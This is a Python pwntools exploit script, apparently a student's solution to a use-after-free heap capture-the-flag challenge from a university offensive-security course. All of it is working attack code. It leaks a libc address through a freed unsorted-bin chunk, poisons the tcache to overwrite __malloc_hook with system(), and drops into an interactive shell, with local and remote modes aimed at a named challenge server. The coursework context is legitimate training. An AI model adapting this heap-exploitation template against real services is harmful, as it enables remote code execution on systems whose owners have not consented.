from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math
import warnings
import time as t
warnings.filterwarnings("ignore") # Had to kill those pwntools ascii warnings...they're annoying

def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

BINARY_FILE = "/home/jnu/Desktop/7-Week/uaf/challenge/chal"
#p = process(BINARY_FILE)

HOST = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 12347
#p = remote(HOST, PORT)

# Array of all of the notes/sizes
NOTES = []

# A function to add a note
#	Input: Process, int representing note size
#	Output: Int representing note pointer
def addNote(p, size):
	n = len(NOTES)
	p.sendline("1")
	print("Adding note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	p.sendline(str(size))
	p.recv()
	p.clean(timeout=0.1)
	NOTES.append(size)
	return(n)


# A function to delete a note
#	Input: Process, Int representing note pointer
#	Output: N/A
def deleteNote(p, n):
	p.sendline("2")
	print("Deleting note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	p.sendline(str(n))
	#p.interactive()
	p.recv()
	p.clean(timeout=0.1)
	return(0)


# A function to read the leaked c address from a note pointer
#	Input: Process, Int representing note number
#	Output: String representing address near glibc in memory
def readAddr(p, n):
	#p.recv()
	p.clean(timeout=0.1)
	p.sendline("4")
	print("Reading address from note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	#p.interactive()
	p.sendline(str(n))
	print(cleanLine(p.recvline()))
	l = p.recv(numb=8)
	lk = hex(unpack(l, 'all', endian='little', sign=False))
	lInt = unpack(l, 'all', endian='little', sign=False)
	print(lk)
	p.recv()
	p.clean(timeout=0.1)
	return(lInt)

# A function that performs the operations to leak an address in libc
#	Input: Process
#	Output: String representing glibc base address
def leakLibC(p):
	# Add note to fall into unsortedbins
	n = addNote(p, 1033)
	t.sleep(0.5)
	# Add border note
	addNote(p, 24)
	t.sleep(0.5)
	# Delete unsortedbins note
	deleteNote(p, n)
	# Read that note and get the address
	leak = readAddr(p, n)
	print("Leaked Address:")
	print(hex(leak))
	t.sleep(0.25)
	return(leak)

def writeNote(p, n, data):
	p.sendline("3")
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	print("Editing note " + str(n))
	p.sendline(str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	print("Sending data: " + hex(data))
	p.sendline(p64(data))
	p.recv()
	p.clean(timeout=0.1)
	t.sleep(0.25)
	return(0)

def arbitraryWrite(p, malHook, system):
	# 1) Add two more same size allocations
	n1 = addNote(p, 24)
	t.sleep(0.5)
	
	n0 = n1 - 1 # This points to that "border note"
	
	n2 = addNote(p, 24)
	t.sleep(0.5)

	# 2) Free N1
	deleteNote(p, n1)
	t.sleep(0.5)

	# 3) Free N0
	deleteNote(p, n0)
	t.sleep(0.5)

	# 4) Edit note to include overwrite data
	writeNote(p, n0, malHook)
	t.sleep(0.5)

	#p.interactive()

	# 5) Allocate a new note
	n3 = addNote(p, 24)
	#p.recv()
	p.clean(timeout=0.1)
	t.sleep(0.5)

	# 6) One more new note
	n4 = addNote(p, 24)
	t.sleep(0.5)

	# 7) Final edit of note4 to hold the address of system
	writeNote(p, n4, system)
	t.sleep(0.5)


def localPwn():
	elf = ELF("./libc-2.31.so")
	p = process(BINARY_FILE)
	p.recv()
	p.clean(timeout=0.1)
	leak = leakLibC(p)

	libc = leak - 0x1ECBE0
	print("LibC Base Address:")
	print(hex(libc))

	system = libc + elf.symbols['system']
	print("System address?")
	print(hex(system))

	malHook = libc + elf.symbols['__malloc_hook']
	print("Malloc address?")
	print(hex(malHook))

	arbitraryWrite(p, malHook, system)
	p.interactive()

def remotePwn():
	elf = ELF("./libc-2.31.so")
	p = remote(HOST, PORT)
	p.recv()
	p.clean(timeout=0.1)
	leak = leakLibC(p)

	libc = leak - 0x1ECBE0
	print("LibC Base Address:")
	print(hex(libc))

	system = libc + elf.symbols['system']
	print("System address?")
	print(hex(system))

	malHook = libc + elf.symbols['__malloc_hook']
	print("Malloc address?")
	print(hex(malHook))

	arbitraryWrite(p, malHook, system)
	p.interactive()

localPwn()
#remotePwn()